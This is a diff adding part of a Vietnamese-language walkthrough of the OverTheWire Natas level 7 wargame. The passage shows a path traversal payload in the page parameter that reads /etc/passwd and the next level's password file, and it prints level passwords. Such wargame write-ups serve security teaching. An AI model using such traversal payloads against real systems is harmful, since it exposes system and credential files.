@@ -337,3 +337,30 @@ print(content)
 **URL:** [http://natas7.natas.labs.overthewire.org](http://natas7.natas.labs.overthewire.org) <br/>
 **Datum:** natas7-7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 
+Ở level này, ta nhận được 2 links ngẫu nhiên ở trang. Nếu để ý ta sẽ thấy URL lấy tên của trang làm biến cho *index.php*
+
+```text
+http://natas7.natas.labs.overthewire.org/index.php?page=home
+http://natas7.natas.labs.overthewire.org/index.php?page=about
+```
+
+Với *hint* đã cho ta biết pwd của **natas8** nằm ở **/etc/natas_webpass/natas8**, vì thế ta thử bypass path traversal bằng *LFI*:
+
+```bash
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/passwd
+```
+
+And here we go!
+
+```bash
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
+```
+
+Ta nhận được pwd:
+
+```text
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+```
+
+*Or this way*
+
